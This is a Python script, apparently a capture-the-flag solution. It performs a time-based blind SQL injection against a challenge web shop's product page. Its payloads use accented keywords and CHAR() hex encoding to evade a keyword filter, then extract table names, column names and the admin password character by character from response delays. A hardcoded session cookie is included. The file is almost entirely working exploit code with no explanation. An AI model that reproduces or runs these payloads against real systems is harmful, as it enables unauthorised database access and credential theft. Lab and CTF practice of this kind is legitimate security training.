#!/usr/bin/env python3

# import pyclip
import binascii
import requests
import string
import time

def string_to_hex(input_string):
    '''
    Convert a string to its hexadecimal representation
    the same way that sqlite3 HEX() function does.
    '''
    encoded_bytes = input_string.encode('utf-8')

    # Convert the bytes to hexadecimal representation
    hex_representation = binascii.hexlify(encoded_bytes).decode('utf-8')

    return hex_representation.upper()

def string_to_char(input_string):
    """
    Convert a string into CHAR(x) SQL representation without using quotes.
    """
    hex_values = [f"0x{binascii.hexlify(c.encode()).decode()}" for c in input_string]
    return f"CHAR({','.join(hex_values)})"


# Your cookies here
cookies = {
    'session': '.eJwlzjsOwyAQBcC7UKdY4AGLL2OxPyWtHVdR7h5L6aeYT9rj8POZtvdx-SPtL0tbmlINRrOyAEWBLOKRg2Yfywp3ttJiqugEuK4Qbyhk3Mv0pat1yM2lM0GURR1YYS3Dg0hljTzIaqOOuP1Qq8bLOQ-niI50R67Tj_8G6fsDE9gwug.Z-JsKQ.qSHsHxz8fqaBTo4qeMYhJu6zAq8',
}

# A session object to keep track of cookies
browser = requests.Session()

# The target URL
url = 'http://cyberchallenge.disi.unitn.it:50055/product/3'
secret = ''
i = 1 # Used to pass to the next character when found one
while True:
    found = False
    for character in string.printable:
        #print(f'Checking character {character}')   
        #char_representation = string_to_char(character)
        #char_representation = string_to_hex(character)

        # Injection for table name
        injTab = f"1 ànd if(HEX((sèlect substr(table_name,{i},1) from information_schema.tables whère table_schema like database() limit 1,1)) like CONCAT(CHAR(39)+{string_to_hex(character)}+CHAR(39)), slèep(1), null)"
        # Injection for columns names
        injCol = f"1 ànd if(HEX((sèlect substr(column_name,{i},1) from information_schema.columns whère table_name like CHAR(0x75,0x73,0x65,0x72) limit 2,1)) like CONCAT(CHAR(39)+{string_to_hex(character)}+CHAR(39)), slèep(1), null)"
        # Injection for admin password
        injPsw = f"1 ànd if(HEX((sèlect substr(password,{i},1) from user whère username like CHAR(0x61,0x64,0x6d,0x69,0x6e))) like CONCAT(CHAR(39)+{string_to_hex(character)}+CHAR(39)), slèep(1), null)"
        
        data = {
            'offer': f'{injPsw}'
        }
        start_time = time.time()
        response = browser.post(url, cookies=cookies, data=data, allow_redirects=False)
        elapsed_time = time.time() - start_time
        
        if elapsed_time >= 1: # Check if response time exceeds 1 seconds
            secret += character
            i += 1
            found = True
            #print(response.status_code)
            print(f'New character found ({character}): {secret}')
            continue
    if not found:
        break
    
        
print(f'Found secret: {secret}')
